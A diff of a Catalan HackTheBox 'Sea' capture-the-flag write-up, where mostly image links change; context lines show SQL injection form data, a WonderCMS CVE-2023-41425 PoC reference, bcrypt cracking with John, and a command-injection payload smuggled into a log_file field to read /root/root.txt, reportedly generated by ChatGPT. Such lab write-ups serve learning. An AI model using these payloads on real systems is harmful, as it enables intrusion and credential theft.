@@ -34,7 +34,7 @@ Ara hem de desar la pàgina amb el nom de domini permx.htb al nostre fitxer /etc
 
 Un cop ho hem fet, accedim a la pàgina web a través del navegador i veiem el següent:
 
-![[Pasted image 20240811150345.png]]
+![image](https://github.com/user-attachments/assets/4ea8d657-47ea-42ae-90ab-ff8ad9dc91d7)
 
 Veiem que és una pàgina d'una empresa que es dedica a organitzar aventures per ciclistes de nit i que ofereixen premis per els 3 primers ciclistes.
 
@@ -129,7 +129,7 @@ A la pàgina web no hi veig res a primer cop d'ull, per tant mirare el codi font
 
 Aquí al codi font hi trobem un formulari web, a través del qual s'hi han d'enviar les nostres dades per poder participar als esdeveniments:
 
-![[Pasted image 20240811151709.png]]
+![image](https://github.com/user-attachments/assets/7d5050c2-dcf0-479f-9e1a-6f1032266600)
 
 El codi font del formulari:
 ```
@@ -254,7 +254,7 @@ El codi font del formulari:
 
 Té vàris camps com a required, i el de website no, per tant provarem de fer injecció sql a veure si obtenim algun resultat. He encès el Burpsuite per veure com va la petició, quina info tinc i què rebo. Al fer la petició i fer un POST enviant el formulari veig el següent:
 
-![[Pasted image 20240811154042.png]]
+![image](https://github.com/user-attachments/assets/c70689f4-ec03-4cc4-96bd-a0023a6ff561)
 
 
 ```
@@ -291,7 +291,7 @@ name=%27+OR+%271%27%3D%271&email=hello%40hello.com&age=2&country=%27+OR+%271%27%
 
 I veiem el missatge per pantalla de que s'ha enviat el formulari correctament:
 
-![[Pasted image 20240811153911.png]]
+![image](https://github.com/user-attachments/assets/6655fb36-4ec4-4da3-a9eb-f747304b90cf)
 
 Ara per veure si el servidor és vulnerable a XSS modificarem els camps de text (com `name`, `country`, o `website`) per introduir codi JavaScript.
 
@@ -321,11 +321,11 @@ messages                [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 
 404                     [Status: 200, Size: 3341, Words: 530, Lines: 85, Duration: 474ms]
 ````
 
-![[Pasted image 20240817174755.png]]
+![image](https://github.com/user-attachments/assets/6dcc0325-0182-4ad2-8261-1a7465ee94f6)
 
 Com a curiositat i lligat a la temàtica de la pàgina web, hi ha el domini bike:
 
-![[Pasted image 20240817175422.png]]
+![image](https://github.com/user-attachments/assets/2226f7b1-22f9-46e4-8962-6ccc923f6671)
 
 Provaré a veure si a través d'aquí aconsegueixo alguna cosa amb útil. Provaré a veure si puc trobar cercant per els dominis que he trobat algun domini, és a dir dominis dins el domini. Ara però, filtrarem per respostes 200 i 301. Anirem fent això amb els diferents dominis dins de dominis trobats fins que trobem alguna cosa útil:
 
@@ -347,7 +347,8 @@ Hem trobat alguns directoris dins el directori /themes/bike, penso que per aquí
 
 Bé, després de gastar molt i molt de temps cercant, enumerant fitxers bàsics a mà dins dels directoris dins dels directoris que hem trobat, ens topem que a dins el directori /themes/bike/README.md hi veiem el text següent:
 
-![[Pasted image 20240817182817.png]]
+![image](https://github.com/user-attachments/assets/9d5ef80d-0626-4851-825c-b90a441e5a85)
+
 
 ```
 # WonderCMS bike theme
@@ -369,11 +370,11 @@ Includes animations.
 
 Hem cercat WonderCMS al navegador i trobem que WonderCMS es posiciona com un sistema de gestió de continguts de codi obert totalment gratuït. Un cop vist què és aquest WinderCMS, cercarem a veure si trobem algun exploit o POC a internet:
 
-![[Pasted image 20240817183053.png]]
+![image](https://github.com/user-attachments/assets/5eed554d-5c3f-42f8-998f-eeee41434a06)
 
 De fet, només posar wondercms al navegador ja ens apareix com a segona cerca exploit i com a quarta default password. Primer cercaré l'exploit, a veure si tenim èxit. Vaig al prime de GitHub que trobo:
 
-![[Pasted image 20240817183417.png]]
+![image](https://github.com/user-attachments/assets/026d350a-c2cb-4d77-ab8c-dd29aace8c57)
 
 
 https://github.com/prodigiousMind/CVE-2023-41425 
@@ -549,11 +550,13 @@ https://hashes.com/en/decrypt/hash
 
 I veiem com ens diu el següent:
 
-![[Pasted image 20240821215139.png]]
+![image](https://github.com/user-attachments/assets/e07bfc9d-fdbf-48e1-a0a9-ccc9014e2b31)
+
 
 Ara amb Jhon the ripper mirarem de "trencar" o crackejar el hash. El primer format que ens suggereix és el bcrypt per tant és el primer que provarem. Per començar ho provarem amb la llista més popular, la rockyou.txt. Abans però, desarem el hash a un fitxer per poder crackejar-lo:
 
-![[Pasted image 20240821215517.png]]
+![image](https://github.com/user-attachments/assets/b534ac5e-f285-41ae-960c-495e99cc7c9f)
+
 
 ``john password.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt``
 
@@ -643,11 +646,13 @@ Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)`
 
 Ara, anem al navegador i anem a`` localhost:8080`` ens sortirà una finestra demanant les credencials i posem les credencials de l'usuari amay. Ara veiem el següent:
 
-![[Pasted image 20240824122107.png]]
+![image](https://github.com/user-attachments/assets/6d201112-65ea-4715-8ca9-05a708b426da)
+
 
 I si ens hi fixem a baix de tot a Analyze Log File veiem que hi ha acces.log i auth.log, utilitzarem Burpsuite per clicar a Analyze i veure si podem interceptar i aconseguir alguna cosa valuosa. He utilitzat el navegador propi de Burpsuite ja que amb el meu no m'ha funcionat i així no perdia el temps mirant quina configuració fallava:
 
-![[Pasted image 20240824122215.png]]
+![image](https://github.com/user-attachments/assets/a7648e5c-a730-4ba1-8e7e-2cf9ab87252d)
+
 
 Ara, enviem al Repeater de Burpsuite les intercepcions que hem fet, i així podrem analitzar bé el que enviem als servidors i les seves respostes:
 
@@ -657,15 +662,18 @@ Després d'analitzar la resposta del servidor dels log que analitzem, ens trobem
 <p class='error'>Suspicious traffic patterns detected in /var/log/apache2/access.log:</p><pre>10.10.16.7 - - [24/Aug/2024:10:28:37 +0000] "GET /themes/revshell-main/rev.php?lhost=10.10.16.7 HTTP/1.1" 404 3666 "-" "curl/7.81.0"</pre>
 ````
 
-![[Pasted image 20240824123700.png]]
+![image](https://github.com/user-attachments/assets/38e81a4e-8f11-4dbe-b468-8891ae001717)
+
 
 A diferència de l'auth.log on hi ha el següent:
 
-![[Pasted image 20240824123801.png]]
+![image](https://github.com/user-attachments/assets/1eae24a7-0daa-4dbb-bad3-dcd3049c157c)
+
 
 Sembla que amb el que hem vist a l'access.log podríem enviar comandes al servidor. Provarem de modificar el log.file al Repeater per enviar alguna comanda a veure si tenim èxit. Funciona:
 
-![[Pasted image 20240824123946.png]]
+![image](https://github.com/user-attachments/assets/081e733f-ddce-4e5f-acda-50e84b3f1674)
+
 
 Per tant, ara li demano al ChatGPT que em generi un payload per obtenir la root flag, i ens fa el següent payload:
 ``log_file=/root/root.txt;cat%20/root/root.txt%3E/tmp/root_flag.txt&analyze_log=``
@@ -685,7 +693,7 @@ I així és com obtenim la root flag:
 <p class='error'>Suspicious traffic patterns detected in /root/root.txt;cat /root/root.txt>/tmp/root_flag.txt:</p><pre>98ad116949266fe68da77aa104ceb3d5</pre>`
 ```
 
-![[Pasted image 20240824130352.png]]
+![image](https://github.com/user-attachments/assets/392306b5-8528-49d3-b24f-71f6a4aaf296)
 
 Com que el payload genera un fitxer al directori /tmp, també podem veure la root flag allà:
 
@@ -713,5 +721,6 @@ amay@sea:/tmp$ cat root_flag.txt
 
 Entreguem la root flag i ja tenim la màquina feta:
 
-![[Pasted image 20240824130750.png]]
+![image](https://github.com/user-attachments/assets/ded8d739-3ccf-48f1-be14-90032ff8b824)
+
 
